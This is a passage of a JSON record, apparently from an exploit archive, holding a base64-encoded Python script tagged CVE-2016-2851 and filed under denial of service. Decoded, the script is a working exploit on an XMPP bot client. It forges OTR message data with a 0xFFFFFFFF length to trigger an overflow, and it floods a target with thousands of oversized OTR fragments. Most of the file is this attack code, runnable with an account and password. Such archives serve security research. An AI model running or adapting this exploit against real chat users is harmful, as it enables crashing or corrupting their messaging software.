gICAgIHJhdyArPSBwYWNrKCJJIiwgMHgxKSAjIHNlbmRlciBrZXkgaWQNCiAgICAgICAgcmF3ICs9IHBhY2soIkkiLCAweDIpICMgcmVjaXBpZW50IGtleSBpZA0KICAgICAgICByYXcgKz0gcGFjaygiIUkiLCAxMCkgIyBsZW4gbmV4dF95DQoJcmF3ICs9ICJCIioxMCAjIG5leHRfeSAjIHdlIGRvbid0IGtub3cgaG93IG1waSB3b3JrcyBidXQgaXQgc2VlbXMgb2sgOykNCiAgICAgICAgcmF3ICs9ICIxMjM0NTY3OCIgIyByZXZlYWwgc2lnIGR1bW15DQogICAgICAgICMgeWVhaCBvdmVyZmxvdyENCiAgICAgICAgcmF3ICs9IHBhY2soIkkiLCAweEZGRkZGRkZGKTsgIyBkYXRhbGVuDQoNCiAgICAgICAgcmV0ICs9IGJhc2U2NC5iNjRlbmNvZGUocmF3KyJBIiooNTctbGVuKHJhdykpKQ0KICAgICAgICByZXR1cm4gcmV0DQoNCiAgICBkZWYgc2VuZF9pbnNhbmVfb3RyKHNlbGYsIHN0YW56YSwgZnJhZ19zaXplLCBpbnN0YW5jZV90YWcsIG91cl90YWcpOg0KICAgICAgICBwcmludCAiRy1GVU5LISINCg0KICAgICAgICAjIHRoaXMgc2hvdWxkIHJlc3VsdCBpbiBhYm91dCAweEZGRkZGRkZGIHRpbWVzICJBIiBiYXNlNjQgZW5jb2RlZCAgICAgICAgDQogICAgICAgIGxlbl9tc2cgPSA1NzI2NjIzMDYwDQogICAgICAgICMgZml4IGZyYWcgc2l6ZSBmb3IgYmFzZTY0DQogICAgICAgIGZyYWdfc2l6ZSA9IChmcmFnX3NpemUgLyA0KSAqIDQNCg0KICAgICAgICBmcmFnX21zZyA9ICJRVUZCIiooZnJhZ19zaXplIC8gNCkNCg0KICAgICAgICBuID0gbGVuX21zZyAvIGZyYWdfc2l6ZSANCiAgICAgICAgIyBkb2VzIG5vdCBldmVubHkgZGl2aWRlPw0KICAgICAgICBpZiBsZW5fbXNnICUgZnJhZ19zaXplID4gMDoNCiAgICAgICAgICAgIG4gKz0gMQ0KICAgICAgICBrID0gMQ0KICAgICAgICBuICs9IDEgIyBpbml0aWFsYm9keSBhZGRzIGFub3RoZXIgZnJhbWUNCiAgICAgICAgaW5pdGlhbGJvZHkgPSAiP09UUiwlaHUsJWh1LCVzLCIgJSAoayAsIG4gLCBzZWxmLmluaXRpYWxfYm9keShpbnN0YW5jZV90YWcsIG91cl90YWcpKQ0KICAgICAgICBwcmludCAiZmlyc3QgZnJhZ21lbnQ6ICIraW5pdGlhbGJvZHkNCiAgICAgICAgbSA9IE1lc3NhZ2UoDQogICAgICAgICAgICAgICAgdG9famlkPXN0YW56YS5nZXRfZnJvbSgpLA0KICAgICAgICAgICAgICAgIGZyb21famlkPXN0YW56YS5nZXRfdG8oKSwNCiAgICAgICAgICAgICAgICBzdGFuemFfdHlwZT1zdGFuemEuZ2V0X3R5cGUoKSwNCiAgICAgICAgICAgICAgICBzdWJqZWN0PSJmb28iLA0KICAgICAgICAgICAgICAgIGJvZHk9aW5pdGlhbGJvZHkpDQogICAgICAgIHNlbGYuY2xpZW50LnN0cmVhbS5zZW5kKG0pDQogICAgICAgIGsgKz0gMQ0KICAgICAgICBwcmludCAiZnJhZyBzaXplOiAlcywgbGVuX21zZzogJXUsIG51bV9mcmFnczogJXUiICUgKGZyYWdfc2l6ZSwgbGVuX21zZywgbikNCiAgICAgICAgY3VyX3BvcyA9IDANCiAgICAgICAgd2hpbGUoY3VyX3BvcyA8IGxlbl9tc2cpOg0KICAgICAgICAgICAgYm9keSA9ICI/T1RSLCVodSwlaHUsJXMsIiAlIChrICwgbiAsIGZyYWdfbXNnKQ0KICAgICAgICAgICAgbSA9IE1lc3NhZ2UoDQogICAgICAgICAgICAgICAgdG9famlkPXN0YW56YS5nZXRfZnJvbSgpLA0KICAgICAgICAgICAgICAgIGZyb21famlkPXN0YW56YS5nZXRfdG8oKSwNCiAgICAgICAgICAgICAgICBzdGFuemFfdHlwZT1zdGFuemEuZ2V0X3R5cGUoKSwNCiAgICAgICAgICAgICAgICBzdWJqZWN0PSJmb28iLA0KICAgICAgICAgICAgICAgIGJvZHk9Ym9keSkNCiAgICAgICAgICAgIHByaW50ICJjdXJfcG9zICV1IG9mICV1IiAlIChjdXJfcG9zLCBsZW5fbXNnKQ0KICAgICAgICAgICAgc2VsZi5jbGllbnQuc3RyZWFtLnNlbmQobSkNCiAgICAgICAgICAgIGsgKz0gMQ0KICAgICAgICAgICAgY3VyX3BvcyA9IGZyYWdfc2l6ZSAqIChrLTIpDQogICAgICAgICAgICB0aW1lLnNsZWVwKDAuOSkNCiAgICAgICAgcHJpbnQgIkZJTkFMIEZSQUc6IGN1cl9wb3MgJXUgb2YgJXUiICUgKGN1cl9wb3MsIGxlbl9tc2cpDQoNCiANCiAgICBkZWYgcHJlc2VuY2Uoc2VsZixzdGFuemEpOg0KICAgICAgICAiIiJIYW5kbGUgJ2F2YWlsYWJsZScgKHdpdGhvdXQgJ3R5cGUnKSBhbmQgJ3VuYXZhaWxhYmxlJyA8cHJlc2VuY2UvPi4iIiINCiAgICAgICAgbXNnPXUiJXMgaGFzIGJlY29tZSAiICUgKHN0YW56YS5nZXRfZnJvbSgpKQ0KICAgICAgICB0PXN0YW56YS5nZXRfdHlwZSgpDQogICAgICAgIGlmIHQ9PSJ1bmF2YWlsYWJsZSI6DQogICAgICAgICAgICBtc2crPXUidW5hdmFpbGFibGUiDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICBtc2crPXUiYXZhaWxhYmxlIg0KDQogICAgICAgIHNob3c9c3RhbnphLmdldF9zaG93KCkNCiAgICAgICAgaWYgc2hvdzoNCiAgICAgICAgICAgIG1zZys9dSIoJXMpIiAlIChzaG93LCkNCg0KICAgICAgICBzdGF0dXM9c3RhbnphLmdldF9zdGF0dXMoKQ0KICAgICAgICBpZiBzdGF0dXM6DQogICAgICAgICAgICBtc2crPXUiOiAiK3N0YXR1cw0KICAgICAgICBwcmludCBtc2cNCg0KICAgIGRlZiBwcmVzZW5jZV9jb250cm9sKHNlbGYsc3RhbnphKToNCiAgICAgICAgIiIiSGFuZGxlIHN1YnNjcmlwdGlvbiBjb250cm9sIDxwcmVzZW5jZS8+IHN0YW56YXMgLS0gYWNrbm93bGVkZ2UNCiAgICAgICAgdGhlbS4iIiINCiAgICAgICAgbXNnPXVuaWNvZGUoc3RhbnphLmdldF9mcm9tKCkpDQogICAgICAgIHQ9c3RhbnphLmdldF90eXBlKCkNCiAgICAgICAgaWYgdD09InN1YnNjcmliZSI6DQogICAgICAgICAgICBtc2crPXUiIGhhcyByZXF1ZXN0ZWQgcHJlc2VuY2Ugc3Vic2NyaXB0aW9uLiINCiAgICAgICAgZWxpZiB0PT0ic3Vic2NyaWJlZCI6DQogICAgICAgICAgICBtc2crPXUiIGhhcyBhY2NlcHRlZCBvdXIgcHJlc2VuY2Ugc3Vic2NyaXB0aW9uIHJlcXVlc3QuIg0KICAgICAgICBlbGlmIHQ9PSJ1bnN1YnNjcmliZSI6DQogICAgICAgICAgICBtc2crPXUiIGhhcyBjYW5jZWxlZCBoaXMgc3Vic2NyaXB0aW9uIG9mIG91ci4iDQogICAgICAgIGVsaWYgdD09InVuc3Vic2NyaWJlZCI6DQogICAgICAgICAgICBtc2crPXUiIGhhcyBjYW5jZWxlZCBvdXIgc3Vic2NyaXB0aW9uIG9mIGhpcyBwcmVzZW5jZS4iDQoNCiAgICAgICAgcHJpbnQgbXNnDQoNCiAgICAgICAgcmV0dXJuIHN0YW56YS5tYWtlX2FjY2VwdF9yZXNwb25zZSgpDQoNCg0KY2xhc3MgVmVyc2lvbkhhbmRsZXIob2JqZWN0KToNCiAgICAiIiJQcm92aWRlcyBoYW5kbGVyIGZvciBhIHZlcnNpb24gcXVlcnkuDQogICAgDQogICAgVGhpcyBjbGFzcyB3aWxsIGFuc3dlciB2ZXJzaW9uIHF1ZXJ5IGFuZCBhbm5vdW5jZSAnamFiYmVyOmlxOnZlcnNpb24nIG5hbWVzcGFjZQ0KICAgIGluIHRoZSBjbGllbnQncyBkaXNjbyNpbmZvIHJlc3VsdHMuIiIiDQogICAgDQogICAgaW1wbGVtZW50cyhJSXFIYW5kbGVyc1Byb3ZpZGVyLCBJRmVhdHVyZXNQcm92aWRlcikNCg0KICAgIGRlZiBfX2luaXRfXyhzZWxmLCBjbGllbnQpOg0KICAgICAgICAiIiJKdXN0IHJlbWVtYmVyIHdobyBjcmVhdGVkIHRoaXMuIiIiDQogICAgICAgIHNlbGYuY2xpZW50ID0gY2xpZW50DQoNCiAgICBkZWYgZ2V0X2ZlYXR1cmVzKHNlbGYpOg0KICAgICAgICAiIiJSZXR1cm4gbmFtZXNwYWNlIHdoaWNoIHNob3VsZCB0aGUgY2xpZW50IGluY2x1ZGUgaW4gaXRzIHJlcGx5IHRvIGENCiAgICAgICAgZGlzY28jaW5mbyBxdWVyeS4iIiINCiAgICAgICAgcmV0dXJuIFsiamFiYmVyOmlxOnZlcnNpb24iXQ0KDQogICAgZGVmIGdldF9pcV9nZXRfaGFuZGxlcnMoc2VsZik6DQogICAgICAgICIiIlJldHVybiBsaXN0IG9mIHR1cGxlcyAoZWxlbWVudF9uYW1lLCBuYW1lc3BhY2UsIGhhbmRsZXIpIGRlc2NyaWJpbmcNCiAgICAgICAgaGFuZGxlcnMgb2YgPGlxIHR5cGU9J2dldCcvPiBzdGFuemFzIiIiDQogICAgICAgIHJldHVybiBbDQogICAgICAgICAgICAoInF1ZXJ5IiwgImphYmJlcjppcTp2ZXJzaW9uIiwgc2VsZi5nZXRfdmVyc2lvbiksDQogICAgICAgICAgICBdDQoNCiAgICBkZWYgZ2V0X2lxX3NldF9oYW5kbGVycyhzZWxmKToNCiAgICAgICAgIiIiUmV0dXJuIGVtcHR5IGxpc3QsIGFzIHRoaXMgY2xhc3MgcHJvdmlkZXMgbm8gPGlxIHR5cGU9J3NldCcvPiBzdGFuemEgaGFuZGxlci4iIiINCiAgICAgICAgcmV0dXJuIFtdDQoNCiAgICBkZWYgZ2V0X3ZlcnNpb24oc2VsZixpcSk6DQogICAgICAgICIiIkhhbmRsZXIgZm9yIGphYmJlcjppcTp2ZXJzaW9uIHF1ZXJpZXMuDQoNCiAgICAgICAgamFiYmVyOmlxOnZlcnNpb24gcXVlcmllcyBhcmUgbm90IHN1cHBvcnRlZCBkaXJlY3RseSBieSBQeVhNUFAsIHNvIHRoZQ0KICAgICAgICBYTUwgbm9kZSBpcyBhY2Nlc3NlZCBkaXJlY3RseSB0aHJvdWdoIHRoZSBsaWJ4bWwyIEFQSS4gIFRoaXMgc2hvdWxkIGJlDQogICAgICAgIHVzZWQgdmVyeSBjYXJlZnVsbHkhIiIiDQogICAgICAgIGlxPWlxLm1ha2VfcmVzdWx0X3Jlc3BvbnNlKCkNCiAgICAgICAgcT1pcS5uZXdfcXVlcnkoImphYmJlcjppcTp2ZXJzaW9uIikNCiAgICAgICAgcS5uZXdUZXh0Q2hpbGQocS5ucygpLCJuYW1lIiwiRWNobyBjb21wb25lbnQiKQ0KICAgICAgICBxLm5ld1RleHRDaGlsZChxLm5zKCksInZlcnNpb24iLCIxLjAiKQ0KICAgICAgICByZXR1cm4gaXENCg0KY2xhc3MgQ2xpZW50KEphYmJlckNsaWVudCk6DQogICAgIiIiU2ltcGxlIGJvdCAoY2xpZW50KSBleGFtcGxlLiBVc2VzIGBweXhtcHAuamFiYmVyLmNsaWVudC5KYWJiZXJDbGllbnRgDQogICAgY2xhc3MgYXMgYmFzZS4gVGhhdCBjbGFzcyBwcm92aWRlcyBiYXNpYyBzdHJlYW0gc2V0dXAgKGluY2x1ZGluZw0KICAgIGF1dGhlbnRpY2F0aW9uKSBhbmQgU2VydmljZSBEaXNjb3Zlcnkgc2VydmVyLiBJdCBhbHNvIGRvZXMgc2VydmVyIGFkZHJlc3MNCiAgICBhbmQgcG9ydCBkaXNjb3ZlcnkgYmFzZWQgb24gdGhlIEpJRCBwcm92aWRlZC4iIiINCg0KICAgIGRlZiBfX2luaXRfXyhzZWxmLCBqaWQsIHBhc3N3b3JkLCB0bHNfY2FjZXJ0cyk6DQogICAgICAgICMgaWYgYmFyZSBKSUQgaXMgcHJvdmlkZWQgYWRkIGEgcmVzb3VyY2UgLS0gaXQgaXMgcmVxdWlyZWQNCiAgICAgICAgaWYgbm90IGppZC5yZXNvdXJjZToNCiAgICAgICAgICAgIGppZD1KSUQoamlkLm5vZGUsIGppZC5kb21haW4sICJhdHRhY2t0ZXN0IikNCg0KICAgICAgICBpZiB0bHNfY2FjZXJ0czoNCiAgICAgICAgICAgIGlmIHRsc19jYWNlcnRzID09ICd0bHNfbm92ZXJpZnknOg0KICAgICAgICAgICAgICAgIHRsc19zZXR0aW5ncyA9IFRMU1NldHRpbmdzKHJlcXVpcmUgPSBUcnVlLCB2ZXJpZnlfcGVlciA9IEZhbHNlKQ0KICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICB0bHNfc2V0dGluZ3MgPSBUTFNTZXR0aW5ncyhyZXF1aXJlID0gVHJ1ZSwgY2FjZXJ0X2ZpbGUgPSB0bHNfY2FjZXJ0cykNCiAgICAgICAgZWxzZToNCiAgICAgICAgICAgIHRsc19zZXR0aW5ncyA9IE5vbmUNCg0KICAgICAgICAjIHNldHVwIGNsaWVudCB3aXRoIHByb3ZpZGVkIGNvbm5lY3Rpb24gaW5mb3JtYXRpb24NCiAgICAgICAgIyBhbmQgaWRlbnRpdHkgZGF0YQ0KICAgICAgICBKYWJiZXJDbGllbnQuX19pbml0X18oc2VsZiwgamlkLCBwYXNzd29yZCwNCiAgICAgICAgICAgICAgICBkaXNjb19uYW1lPSJQeVhNUFAgZXhhbXBsZTogZWNobyBib3QiLCBkaXNjb190eXBlPSJib3QiLA0KICAgICAgICAgICAgICAgIHRsc19zZXR0aW5ncyA9IHRsc19zZXR0aW5ncykNCg0KICAgICAgICAjIGFkZCB0aGUgc2VwYXJhdGUgY29tcG9uZW50cw0KICAgICAgICBzZWxmLmludGVyZmFjZV9wcm92aWRlcnMgPSBbDQogICAgICAgICAgICBWZXJzaW9uSGFuZGxlcihzZWxmKSwNCiAgICAgICAgICAgIEVjaG9IYW5kbGVyKHNlbGYpLA0KICAgICAgICAgICAgXQ0KDQogICAgZGVmIHN0cmVhbV9zdGF0ZV9jaGFuZ2VkKHNlbGYsc3RhdGUsYXJnKToNCiAgICAgICAgIiIiVGhpcyBvbmUgaXMgY2FsbGVkIHdoZW4gdGhlIHN0YXRlIG9mIHN0cmVhbSBjb25uZWN0aW5nIHRoZSBjb21wb25lbnQNCiAgICAgICAgdG8gYSBzZXJ2ZXIgY2hhbmdlcy4gVGhpcyB3aWxsIHVzdWFsbHkgYmUgdXNlZCB0byBsZXQgdGhlIHVzZXINCiAgICAgICAga25vdyB3aGF0IGlzIGdvaW5nIG9uLiIiIg0KICAgICAgICBwcmludCAiKioqIFN0YXRlIGNoYW5nZWQ6ICVzICVyICoqKiIgJSAoc3RhdGUsYXJnKQ0KDQogICAgZGVmIHByaW50X3Jvc3Rlcl9pdGVtKHNlbGYsaXRlbSk6DQogICAgICAgIGlmIGl0ZW0ubmFtZToNCiAgICAgICAgICAgIG5hbWU9aXRlbS5uYW1lDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICBuYW1lPXUiIg0KICAgICAgICBwcmludCAodSclcyAiJXMiIHN1YnNjcmlwdGlvbj0lcyBncm91cHM9JXMnDQogICAgICAgICAgICAgICAgJSAodW5pY29kZShpdGVtLmppZCksIG5hbWUsIGl0ZW0uc3Vic2NyaXB0aW9uLA0KICAgICAgICAgICAgICAgICAgICB1IiwiLmpvaW4oaXRlbS5ncm91cHMpKSApDQoNCiAgICBkZWYgcm9zdGVyX3VwZGF0ZWQoc2VsZixpdGVtPU5vbmUpOg0KICAgICAgICBpZiBub3QgaXRlbToNCiAgICAgICAgICAgIHByaW50IHUiTXkgcm9zdGVyOiINCiAgICAgICAgICAgIGZvciBpdGVtIGluIHNlbGYucm9zdGVyLmdldF9pdGVtcygpOg0KICAgICAgICAgICAgICAgIHNlbGYucHJpbnRfcm9zdGVyX2l0ZW0oaXRlbSkNCiAgICAgICAgICAgIHJldHVybg0KICAgICAgICBwcmludCB1IlJvc3RlciBpdGVtIHVwZGF0ZWQ6Ig0KICAgICAgICBzZWxmLnByaW50X3Jvc3Rlcl9pdGVtKGl0ZW0pDQoNCiMgWE1QUCBwcm90b2NvbCBpcyBVbmljb2RlLWJhc2VkIHRvIHByb3Blcmx5IGRpc3BsYXkgZGF0YSByZWNlaXZlZA0KIyBfbXVzdF8gY29udmVydCBpdCB0byBsb2NhbCBlbmNvZGluZyBvciBVbmljb2RlRXhjZXB0aW9uIG1heSBiZSByYWlzZWQNCmxvY2FsZS5zZXRsb2NhbGUobG9jYWxlLkxDX0NUWVBFLCAiIikNCmVuY29kaW5nID0gbG9jYWxlLmdldGxvY2FsZSgpWzFdDQppZiBub3QgZW5jb2Rpbmc6DQogICAgZW5jb2RpbmcgPSAidXMtYXNjaWkiDQpzeXMuc3Rkb3V0ID0gY29kZWNzLmdldHdyaXRlcihlbmNvZGluZykoc3lzLnN0ZG91dCwgZXJyb3JzID0gInJlcGxhY2UiKQ0Kc3lzLnN0ZGVyciA9IGNvZGVjcy5nZXR3cml0ZXIoZW5jb2RpbmcpKHN5cy5zdGRlcnIsIGVycm9ycyA9ICJyZXBsYWNlIikNCg0KDQojIFB5WE1QUCB1c2VzIGBsb2dnaW5nYCBtb2R1bGUgZm9yIGl0cyBkZWJ1ZyBvdXRwdXQNCiMgYXBwbGljYXRpb25zIHNob3VsZCBzZXQgaXQgdXAgYXMgbmVlZGVkDQpsb2dnZXIgPSBsb2dnaW5nLmdldExvZ2dlcigpDQpsb2dnZXIuYWRkSGFuZGxlcihsb2dnaW5nLlN0cmVhbUhhbmRsZXIoKSkNCmxvZ2dlci5zZXRMZXZlbChsb2dnaW5nLklORk8pICMgY2hhbmdlIHRvIERFQlVHIGZvciBoaWdoZXIgdmVyYm9zaXR5DQoNCmlmIGxlbihzeXMuYXJndikgPCAzOg0KICAgIHByaW50IHUiVXNhZ2U6Ig0KICAgIHByaW50ICJcdCVzIEpJRCBwYXNzd29yZCBbJ3Rsc19ub3ZlcmlmeSd8Y2FjZXJ0X2ZpbGVdIiAlIChzeXMuYXJndlswXSwpDQogICAgcHJpbnQgImV4YW1wbGU6Ig0KICAgIHByaW50ICJcdCVzIHRlc3RAbG9jYWxob3N0IHZlcnlzZWNyZXQiICUgKHN5cy5hcmd2WzBdLCkNCiAgICBzeXMuZXhpdCgxKQ0KDQpwcmludCB1ImNyZWF0aW5nIGNsaWVudC4uLiINCg0KYz1DbGllbnQoSklEKHN5cy5hcmd2WzFdKSwgc3lzLmFyZ3ZbMl0sIHN5cy5hcmd2WzNdIGlmIGxlbihzeXMuYXJndikgPiAzIGVsc2UgTm9uZSkNCg0KcHJpbnQgdSJjb25uZWN0aW5nLi4uIg0KYy5jb25uZWN0KCkNCg0KcHJpbnQgdSJsb29waW5nLi4uIg0KdHJ5Og0KICAgICMgQ29tcG9uZW50IGNsYXNzIHByb3ZpZGVzIGJhc2ljICJtYWluIGxvb3AiIGZvciB0aGUgYXBwbGl0YXRpb24NCiAgICAjIFRob3VnaCwgbW9zdCBhcHBsaWNhdGlvbnMgd291bGQgbmVlZCB0byBoYXZlIHRoZWlyIG93biBsb29wIGFuZCBjYWxsDQogICAgIyBjb21wb25lbnQuc3RyZWFtLmxvb3BfaXRlcigpIGZyb20gaXQgd2hlbmV2ZXIgYW4gZXZlbnQgb24NCiAgICAjIGNvbXBvbmVudC5zdHJlYW0uZmlsZW5vKCkgb2NjdXJzLg0KICAgIGMubG9vcCgxKQ0KZXhjZXB0IElPRXJyb3IsIGU6DQogICAgaWYgZS5lcnJubyA9PSBlcnJuby5FUElQRToNCiAgICAjIElHTk9SRSBFUElQRSBlcnJvcg0KICAgICAgICBwcmludCAiUElQRSBFUlJPUiAtLSBJR05PUklORyINCiAgICBlbHNlOg0KICAgICAgICBwYXNzDQoNCg0KZXhjZXB0IEtleWJvYXJkSW50ZXJydXB0Og0KICAgIHByaW50IHUiZGlzY29ubmVjdGluZy4uLiINCiAgICBjLmRpc2Nvbm5lY3QoKQ0KDQpwcmludCB1ImV4aXRpbmcuLi4iDQojIHZpOiBzdHM9NCBldCBzdz00", 
    "filename": "platforms/multiple/dos/39550.py", 
    "id": "39550", 
    "cves": [
        "CVE-2016-2851"
    ]
}